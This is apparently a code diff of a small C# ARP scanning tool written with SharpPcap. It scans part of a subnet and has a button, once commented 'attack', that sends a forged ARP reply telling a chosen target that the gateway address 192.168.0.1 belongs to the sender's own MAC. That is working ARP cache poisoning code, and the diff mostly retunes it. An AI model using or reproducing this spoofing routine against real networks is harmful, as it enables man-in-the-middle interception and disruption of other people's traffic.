@@ -44,7 +44,7 @@ namespace ARPSCanning
                 cbox_ipaddr.Focus();
                 return;
             }
-
+            lview_name.Items.Clear();
             string ip_addr = cbox_ipaddr.Text;
             if (flag)
             {
@@ -67,7 +67,7 @@ namespace ARPSCanning
             flag = true;
             LibPcapLiveDevice device = (LibPcapLiveDevice)dev;
             string ip;
-            for (int i= 0;i<255;i++)
+            for (int i= 0;i<20;i++)
             {
                 if (ip_addr.Length == 0)
                 {
@@ -81,7 +81,8 @@ namespace ARPSCanning
                 string result = ScanHost(ip, device);
                 if (result != "fail")
                     UpdateList(ip, result);
-            }            
+            }
+            MessageBox.Show("완료");
             flag = false;
         }
 
@@ -177,24 +178,23 @@ namespace ARPSCanning
 
         private void button2_Click(object sender, EventArgs e)
         {
-            // 공격ㄱㄱ
             var device = LibPcapLiveDeviceList.Instance[1];
             device.Open(DeviceMode.Promiscuous, 1000);
             IPAddress dst_ip = null;
             IPAddress src_ip = null;
             PhysicalAddress dst_mac = null;
             PhysicalAddress src_mac = null;
-            
+
             dst_ip = IPAddress.Parse(tbox_ip.Text);
-            dst_mac = PhysicalAddress.Parse(tbox_mac.Text.Replace(':','-'));
-            src_ip = IPAddress.Parse("192.168.32.254");
+            dst_mac = PhysicalAddress.Parse(tbox_mac.Text.Replace(':', '-'));
+            src_ip = IPAddress.Parse("192.168.0.1");
             src_mac = NetworkInterface.GetAllNetworkInterfaces()[1].GetPhysicalAddress();
 
             ARPPacket arp = new ARPPacket(ARPOperation.Response, dst_mac, dst_ip, src_mac, src_ip);
             EthernetPacket epacket = new EthernetPacket(src_mac, dst_mac, EthernetPacketType.Arp);
-            arp.PayloadData = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
             epacket.PayloadPacket = arp;
             device.SendPacket(epacket);
+            device.Close();
         }
     }
 }
